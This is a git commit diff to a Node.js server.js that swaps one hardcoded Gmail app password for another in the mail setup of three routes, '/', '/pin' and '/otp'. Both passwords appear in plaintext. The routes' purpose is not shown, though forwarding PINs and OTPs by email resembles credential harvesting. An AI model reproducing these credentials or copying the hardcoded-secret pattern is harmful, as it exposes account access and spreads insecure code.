9e07213aec71ae692ba297084584c2cbef9d883b
Mmaghaebube <156246505+Mmaghaebube@users.noreply.github.com>
2024-03-23 21:21:12 +0100

    Update server.js

--- server.js
+++ server.js
@@ -21,7 +21,7 @@ app.post("/", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "duflkdazrkeccnpd",
     },
   });
 
@@ -51,7 +51,7 @@ app.post("/pin", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "duflkdazrkeccnpd",
     },
   });
 
@@ -81,7 +81,7 @@ app.post("/otp", (req, res) => {
     service: "gmail",
     auth: {
       user: "Mmaghaebube@gmail.com",
-      pass: "ghbuwywltyalfeyd",
+      pass: "duflkdazrkeccnpd",
     },
   });
 
